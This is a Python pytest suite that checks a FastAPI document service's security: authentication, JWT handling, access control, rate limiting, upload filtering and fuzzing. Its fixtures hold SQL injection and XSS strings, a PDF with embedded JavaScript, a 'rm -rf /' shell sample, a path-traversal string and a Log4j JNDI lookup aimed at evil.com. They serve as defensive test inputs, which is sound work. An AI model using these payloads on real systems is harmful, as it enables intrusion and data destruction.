import pytest
import jwt
import time
from pathlib import Path
from typing import Dict, Any
from uuid import UUID
import re
from fastapi.testclient import TestClient
from fastapi import status
import secrets
import base64
from datetime import datetime, timedelta

from main import app
from models.users import UserCreate
from services.auth import get_password_hash

@pytest.fixture
def test_client():
    return TestClient(app)

@pytest.fixture
def malicious_pdf_content():
    """Create a malicious PDF content for testing."""
    return b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n/OpenAction << /S /JavaScript /JS (app.alert(1)) >>\n>>\nendobj"

@pytest.fixture
def sql_injection_attempts():
    """Common SQL injection patterns to test."""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users; --",
        "' OR '1'='1' /*",
        "admin'--",
        "1'; SELECT * FROM users WHERE 't' = 't"
    ]

@pytest.fixture
def xss_attempts():
    """Common XSS attack patterns to test."""
    return [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "'-alert('xss')-'",
        "<a href='javascript:alert(\"xss\")'>link</a>"
    ]

@pytest.mark.asyncio
async def test_authentication_security(
    test_client: TestClient,
    test_user_create: UserCreate
):
    """Test authentication security measures."""
    # 1. Test password requirements
    weak_passwords = [
        "short",  # Too short
        "12345678",  # Only numbers
        "abcdefgh",  # Only lowercase
        "password",  # Common password
        "        ",  # Only spaces
    ]
    
    for password in weak_passwords:
        response = test_client.post(
            "/auth/register",
            json={
                "email": "test@example.com",
                "password": password,
                "full_name": "Test User"
            }
        )
        assert response.status_code == status.HTTP_400_BAD_REQUEST
    
    # 2. Test brute force protection
    for _ in range(10):
        response = test_client.post(
            "/auth/login",
            data={
                "username": "nonexistent@example.com",
                "password": "wrongpassword"
            }
        )
    
    # Should be rate limited now
    response = test_client.post(
        "/auth/login",
        data={
            "username": "nonexistent@example.com",
            "password": "wrongpassword"
        }
    )
    assert response.status_code == status.HTTP_429_TOO_MANY_REQUESTS
    
    # 3. Test token security
    # Register valid user
    response = test_client.post(
        "/auth/register",
        json={
            "email": test_user_create.email,
            "password": test_user_create.password,
            "full_name": test_user_create.full_name
        }
    )
    assert response.status_code == status.HTTP_201_CREATED
    
    # Get valid token
    response = test_client.post(
        "/auth/login",
        data={
            "username": test_user_create.email,
            "password": test_user_create.password
        }
    )
    valid_token = response.json()["access_token"]
    
    # Test expired token
    expired_token = jwt.encode(
        {
            "sub": test_user_create.email,
            "exp": datetime.utcnow() - timedelta(minutes=1)
        },
        "your-secret-key",
        algorithm="HS256"
    )
    
    response = test_client.get(
        "/documents",
        headers={"Authorization": f"Bearer {expired_token}"}
    )
    assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    # Test invalid signature
    tampered_token = valid_token[:-1] + ("1" if valid_token[-1] == "0" else "0")
    response = test_client.get(
        "/documents",
        headers={"Authorization": f"Bearer {tampered_token}"}
    )
    assert response.status_code == status.HTTP_401_UNAUTHORIZED

@pytest.mark.asyncio
async def test_authorization_security(
    test_client: TestClient,
    auth_token: str,
    test_user_create: UserCreate,
    sample_pdf_content: bytes,
    temp_dir: Path
):
    """Test authorization and access control."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # 1. Create resource as first user
    test_file = temp_dir / "test.pdf"
    test_file.write_bytes(sample_pdf_content)
    
    with open(test_file, "rb") as f:
        response = test_client.post(
            "/documents/upload",
            files={"file": ("test.pdf", f, "application/pdf")},
            headers=headers
        )
    document_id = response.json()["id"]
    
    # 2. Create second user and try to access first user's resource
    other_user = UserCreate(
        email="other@example.com",
        password="StrongPass123!",
        full_name="Other User"
    )
    
    response = test_client.post(
        "/auth/register",
        json={
            "email": other_user.email,
            "password": other_user.password,
            "full_name": other_user.full_name
        }
    )
    
    response = test_client.post(
        "/auth/login",
        data={
            "username": other_user.email,
            "password": other_user.password
        }
    )
    other_token = response.json()["access_token"]
    other_headers = {"Authorization": f"Bearer {other_token}"}
    
    # Try various unauthorized access attempts
    endpoints = [
        f"/documents/{document_id}",
        f"/documents/{document_id}/process",
        f"/documents/{document_id}/delete",
    ]
    
    for endpoint in endpoints:
        response = test_client.get(endpoint, headers=other_headers)
        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]
        
        response = test_client.post(endpoint, headers=other_headers)
        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]
        
        response = test_client.delete(endpoint, headers=other_headers)
        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]

@pytest.mark.asyncio
async def test_input_validation_security(
    test_client: TestClient,
    auth_token: str,
    sql_injection_attempts: List[str],
    xss_attempts: List[str]
):
    """Test input validation and sanitization."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # 1. Test SQL injection prevention
    for injection in sql_injection_attempts:
        # Test in search endpoint
        response = test_client.post(
            "/search",
            json={"query": injection},
            headers=headers
        )
        assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR
        
        # Test in document creation
        response = test_client.post(
            "/documents",
            json={"name": injection},
            headers=headers
        )
        assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR
    
    # 2. Test XSS prevention
    for xss in xss_attempts:
        # Test in template content
        response = test_client.post(
            "/templates",
            json={
                "name": "Test Template",
                "description": "Test",
                "content": xss
            },
            headers=headers
        )
        if response.status_code == status.HTTP_201_CREATED:
            content = response.json()["content"]
            assert "<script>" not in content.lower()
            assert "javascript:" not in content.lower()
            assert "onerror=" not in content.lower()
            assert "onload=" not in content.lower()

@pytest.mark.asyncio
async def test_file_upload_security(
    test_client: TestClient,
    auth_token: str,
    malicious_pdf_content: bytes,
    temp_dir: Path
):
    """Test file upload security measures."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # 1. Test malicious file upload
    test_file = temp_dir / "malicious.pdf"
    test_file.write_bytes(malicious_pdf_content)
    
    with open(test_file, "rb") as f:
        response = test_client.post(
            "/documents/upload",
            files={"file": ("malicious.pdf", f, "application/pdf")},
            headers=headers
        )
    assert response.status_code == status.HTTP_400_BAD_REQUEST
    
    # 2. Test file type validation
    invalid_files = [
        ("script.js", b"alert('test')", "application/javascript"),
        ("shell.sh", b"#!/bin/bash\nrm -rf /", "text/x-shellscript"),
        ("test.exe", b"MZ\x90\x00\x03\x00\x00\x00", "application/x-msdownload"),
    ]
    
    for filename, content, content_type in invalid_files:
        test_file = temp_dir / filename
        test_file.write_bytes(content)
        
        with open(test_file, "rb") as f:
            response = test_client.post(
                "/documents/upload",
                files={"file": (filename, f, content_type)},
                headers=headers
            )
        assert response.status_code == status.HTTP_400_BAD_REQUEST

@pytest.mark.asyncio
async def test_data_protection(
    test_client: TestClient,
    auth_token: str,
    sample_pdf_content: bytes,
    temp_dir: Path
):
    """Test data protection and privacy measures."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # 1. Upload document
    test_file = temp_dir / "test.pdf"
    test_file.write_bytes(sample_pdf_content)
    
    with open(test_file, "rb") as f:
        response = test_client.post(
            "/documents/upload",
            files={"file": ("test.pdf", f, "application/pdf")},
            headers=headers
        )
    document_id = response.json()["id"]
    
    # 2. Test data access without authentication
    response = test_client.get(f"/documents/{document_id}")
    assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    # 3. Test data deletion
    response = test_client.delete(
        f"/documents/{document_id}",
        headers=headers
    )
    assert response.status_code == status.HTTP_200_OK
    
    # Verify data is completely removed
    response = test_client.get(
        f"/documents/{document_id}",
        headers=headers
    )
    assert response.status_code == status.HTTP_404_NOT_FOUND
    
    # 4. Test data in error responses
    response = test_client.get(
        f"/documents/{UUID('12345678-1234-5678-1234-567812345678')}",
        headers=headers
    )
    assert response.status_code == status.HTTP_404_NOT_FOUND
    assert "internal" not in response.text.lower()
    assert "stack" not in response.text.lower()
    assert "error" in response.text.lower()

@pytest.mark.asyncio
async def test_rate_limiting(
    test_client: TestClient,
    auth_token: str
):
    """Test rate limiting protection."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # 1. Test API rate limiting
    for _ in range(100):
        response = test_client.get("/documents", headers=headers)
    
    response = test_client.get("/documents", headers=headers)
    assert response.status_code == status.HTTP_429_TOO_MANY_REQUESTS
    
    # 2. Test login rate limiting
    for _ in range(10):
        response = test_client.post(
            "/auth/login",
            data={
                "username": "test@example.com",
                "password": "wrongpassword"
            }
        )
    
    response = test_client.post(
        "/auth/login",
        data={
            "username": "test@example.com",
            "password": "wrongpassword"
        }
    )
    assert response.status_code == status.HTTP_429_TOO_MANY_REQUESTS

@pytest.mark.asyncio
async def test_advanced_authorization_patterns(
    test_client: TestClient,
    auth_token: str,
    test_user_create: UserCreate
):
    """Test complex authorization scenarios including role hierarchies and permission inheritance."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # 1. Test role hierarchy
    roles = ["admin", "manager", "user"]
    permissions = {
        "admin": ["create", "read", "update", "delete", "manage_users"],
        "manager": ["create", "read", "update", "manage_team"],
        "user": ["read", "update_own"]
    }
    
    # Create test resources
    resources = []
    for i in range(3):
        response = test_client.post(
            "/documents",
            json={"name": f"test_doc_{i}", "content": "test content"},
            headers=headers
        )
        assert response.status_code == status.HTTP_201_CREATED
        resources.append(response.json()["id"])
    
    # Test permission inheritance
    for role in roles:
        # Create user with role
        user = UserCreate(
            email=f"{role}@example.com",
            password="StrongPass123!",
            full_name=f"{role.title()} User"
        )
        
        response = test_client.post(
            "/auth/register",
            json={
                "email": user.email,
                "password": user.password,
                "full_name": user.full_name,
                "role": role
            }
        )
        assert response.status_code == status.HTTP_201_CREATED
        
        # Get token for role
        response = test_client.post(
            "/auth/login",
            data={
                "username": user.email,
                "password": user.password
            }
        )
        role_token = response.json()["access_token"]
        role_headers = {"Authorization": f"Bearer {role_token}"}
        
        # Test permissions
        for permission in permissions[role]:
            if permission == "create":
                response = test_client.post(
                    "/documents",
                    json={"name": "new_doc", "content": "test"},
                    headers=role_headers
                )
                assert response.status_code == status.HTTP_201_CREATED
            
            elif permission == "read":
                for resource_id in resources:
                    response = test_client.get(
                        f"/documents/{resource_id}",
                        headers=role_headers
                    )
                    assert response.status_code == status.HTTP_200_OK
            
            elif permission == "update":
                for resource_id in resources:
                    response = test_client.put(
                        f"/documents/{resource_id}",
                        json={"content": "updated content"},
                        headers=role_headers
                    )
                    assert response.status_code == status.HTTP_200_OK
            
            elif permission == "delete":
                response = test_client.delete(
                    f"/documents/{resources[-1]}",
                    headers=role_headers
                )
                assert response.status_code == status.HTTP_200_OK
                resources.pop()
            
            elif permission == "manage_users":
                response = test_client.get(
                    "/users",
                    headers=role_headers
                )
                assert response.status_code == status.HTTP_200_OK
            
            elif permission == "manage_team":
                response = test_client.get(
                    "/team",
                    headers=role_headers
                )
                assert response.status_code == status.HTTP_200_OK
            
            elif permission == "update_own":
                # Should only be able to update own documents
                own_doc_response = test_client.post(
                    "/documents",
                    json={"name": "own_doc", "content": "test"},
                    headers=role_headers
                )
                assert own_doc_response.status_code == status.HTTP_201_CREATED
                own_doc_id = own_doc_response.json()["id"]
                
                response = test_client.put(
                    f"/documents/{own_doc_id}",
                    json={"content": "updated content"},
                    headers=role_headers
                )
                assert response.status_code == status.HTTP_200_OK
                
                # Should not be able to update others' documents
                for resource_id in resources:
                    response = test_client.put(
                        f"/documents/{resource_id}",
                        json={"content": "updated content"},
                        headers=role_headers
                    )
                    assert response.status_code == status.HTTP_403_FORBIDDEN

@pytest.mark.asyncio
async def test_api_fuzzing(
    test_client: TestClient,
    auth_token: str
):
    """Test API endpoints with fuzzed inputs to identify potential vulnerabilities."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # Define fuzzing patterns
    fuzz_patterns = {
        "strings": [
            "",  # Empty string
            "A" * 1000,  # Very long string
            "🔥" * 100,  # Unicode/emoji
            "\x00\x01\x02\x03",  # Binary data
            "<script>alert(1)</script>",  # XSS attempt
            "'; DROP TABLE users; --",  # SQL injection
            "../../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/x}",  # Log4j style injection
            "undefined",  # JavaScript undefined
            "null",  # NULL value
        ],
        "numbers": [
            0,
            -1,
            2**31 - 1,  # Max 32-bit int
            -(2**31),  # Min 32-bit int
            2**63 - 1,  # Max 64-bit int
            float('inf'),
            float('-inf'),
            float('nan')
        ],
        "objects": [
            {},
            {"": ""},
            {"*": "*"},
            {"__proto__": "poison"},
            {"constructor": "poison"},
            {"prototype": "poison"}
        ]
    }
    
    # Test endpoints with fuzzed inputs
    endpoints = [
        ("/documents/search", "POST", {"query": ""}),
        ("/documents", "POST", {"name": "", "content": ""}),
        ("/templates", "POST", {"name": "", "content": ""}),
        ("/users/profile", "PUT", {"full_name": "", "email": ""})
    ]
    
    for endpoint, method, base_payload in endpoints:
        # Test string fuzzing
        for pattern in fuzz_patterns["strings"]:
            payload = {k: pattern for k in base_payload.keys()}
            response = test_client.request(
                method,
                endpoint,
                json=payload,
                headers=headers
            )
            assert response.status_code not in [
                status.HTTP_500_INTERNAL_SERVER_ERROR,
                status.HTTP_502_BAD_GATEWAY,
                status.HTTP_503_SERVICE_UNAVAILABLE
            ]
        
        # Test number fuzzing
        for number in fuzz_patterns["numbers"]:
            payload = {k: number for k in base_payload.keys()}
            response = test_client.request(
                method,
                endpoint,
                json=payload,
                headers=headers
            )
            assert response.status_code not in [
                status.HTTP_500_INTERNAL_SERVER_ERROR,
                status.HTTP_502_BAD_GATEWAY,
                status.HTTP_503_SERVICE_UNAVAILABLE
            ]
        
        # Test object fuzzing
        for obj in fuzz_patterns["objects"]:
            payload = {k: obj for k in base_payload.keys()}
            response = test_client.request(
                method,
                endpoint,
                json=payload,
                headers=headers
            )
            assert response.status_code not in [
                status.HTTP_500_INTERNAL_SERVER_ERROR,
                status.HTTP_502_BAD_GATEWAY,
                status.HTTP_503_SERVICE_UNAVAILABLE
            ] 